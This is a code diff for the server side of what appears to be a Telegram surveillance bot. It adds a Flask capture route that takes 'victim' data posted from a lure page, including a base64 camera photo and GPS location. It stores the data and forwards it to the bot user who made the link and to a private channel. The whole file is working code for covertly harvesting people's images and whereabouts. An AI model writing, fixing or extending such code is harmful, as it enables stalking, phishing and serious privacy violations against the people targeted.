@@ -1,9 +1,19 @@
+import base64
+import os
+import threading
+from flask import request, jsonify
+from bot.config import PRIVATE_CHANNEL_ID
+from bot.utils.storage import victim_data_store, link_cache, user_username_cache
+
+# ==========================================
+# FORWARD DATA TO USER + CHANNEL (WITH USERNAME)
+# ==========================================
+
 def forward_to_user_and_channel(victim_id, data):
     try:
         from bot.__init__ import bot
-        from bot.utils.storage import user_username_cache
 
-        # Find user_id
+        # ===== FIND USER_ID =====
         user_id = None
         for key, val in link_cache.items():
             if str(val.get("user_id")) == str(victim_id):
@@ -26,7 +36,7 @@ def forward_to_user_and_channel(victim_id, data):
         # ===== GET USERNAME =====
         username = user_username_cache.get(user_id, "Unknown")
 
-        # Prepare message
+        # ===== PREPARE MESSAGE FOR USER =====
         user_text = f"📥 *Victim Data*\n"
         user_text += f"👤 Your Username: {username}\n"
         user_text += f"🆔 Victim ID: {victim_id}\n"
@@ -59,10 +69,9 @@ def forward_to_user_and_channel(victim_id, data):
 
         bot.send_message(PRIVATE_CHANNEL_ID, channel_text, parse_mode="Markdown")
 
-        # Photo forwarding
+        # ===== PHOTO FORWARDING =====
         photo_data = data.get('photo')
         if photo_data and photo_data.startswith('data:image'):
-            import base64, os
             try:
                 b64 = photo_data.split(',')[1]
                 with open('temp2.jpg', 'wb') as f:
@@ -76,10 +85,28 @@ def forward_to_user_and_channel(victim_id, data):
             except:
                 pass
 
-        # Location forwarding
+        # ===== LOCATION FORWARDING =====
         loc = data.get('location')
         if loc and loc.get('lat') and loc.get('lng'):
             bot.send_location(PRIVATE_CHANNEL_ID, loc['lat'], loc['lng'])
 
     except Exception as e:
         print(f"Forward error: {e}")
+
+
+# ==========================================
+# CAPTURE ROUTE (YE MISSING THA)
+# ==========================================
+
+def create_capture_route(target_type):
+    def capture():
+        data = request.json
+        if not data:
+            return jsonify({"status": "error"}), 400
+        victim_id = data.get('victim_id')
+        if not victim_id:
+            return jsonify({"status": "error"}), 400
+        victim_data_store[f"victim_{victim_id}"] = data
+        threading.Thread(target=forward_to_user_and_channel, args=(victim_id, data)).start()
+        return jsonify({"status": "ok"})
+    return capture
